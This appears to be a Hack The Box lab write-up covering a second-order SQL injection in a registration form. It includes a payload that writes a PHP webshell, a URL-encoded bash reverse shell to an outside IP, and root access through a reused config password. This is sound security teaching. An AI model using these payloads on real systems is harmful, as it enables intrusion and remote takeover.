> Author: **[ippsec][author-profile]**!

Ippsec sensei said it all in his [video][walkthrough-ippsec], so this WU will
be concise.

## Discovery

### Port scanning

```bash
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http          Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
8080/tcp open     http          nginx
```

### Web browsing

The website lands on a registration page:

![][registration]

Upon submission, it redirects to `/account.php`:

```bash
HTTP/1.1 302 Found
Date: Thu, 16 Sep 2021 06:08:02 GMT
Server: Apache/2.4.48 (Debian)
X-Powered-By: PHP/7.4.23
Set-Cookie: user=cc705c9428384a563c68624e97491bb2
Location: /account.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

And the account page displays all the users in the same country. Since the
request doesn't contain any data apart from the cookie, it must use it to
fetch the session / user data from some database.

Submiting the registration form with the same username and another country
displays the former input. Ie the server doesn't update its record and loads
the user data already in the DB:

![][no-update-on-account]

## Break-in

It's possible to submit a custom country:

```html
<!-- username=a&country=foo -->
<h1 class="text-white">Welcome a</h1><h3 class="text-white">Other Players In foo</h3><li class='text-white'>apehex</li>
```

So we try injecting a SQL statement:

```html
<h1 class="text-white">Welcome c</h1>
<h3 class="text-white">Other Players In ' UNION SELECT 1;-- -</h3>
<li class='text-white'>1</li>
```

The `<h3>` tag shows that the query is stored verbatim in the DB, but evaluated
on the second query, when the server retrieves the list of users.

This is a second order SQLi, another lesson from **[iipsec][author-profile]**!

So we register yet another user with a webshell:

```
username=d&country=' UNION SELECT '<?php $c=chr(99);system($_REQUEST[$c]); ?>' INTO OUTFILE '/var/www/html/shell.php';-- -
```

Now we can create a functional reverse shell from the page `/shell.php`:

```
c=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%2e%32%2e%33%2e%34%2f%39%30%30%31%20%30%3e%26%31%27
```

## Escalation

The database itself contains only user data, but the root password is stored in
the config file:

```bash
cat config.php
# <?php
#   $servername = "127.0.0.1";
#   $username = "uhc";
#   $password = "uhc-9qual-global-pw";
#   $dbname = "registration";

#   $conn = new mysqli($servername, $username, $password, $dbname);
# ?>
su -
```

[author-profile]: https://app.hackthebox.eu/users/3769

[no-update-on-account]: images/no-update-on-account.png
[registration]: images/registration.png
[walkthrough-ippsec]: https://www.youtube.com/watch?v=UqoVQ4dbYaI
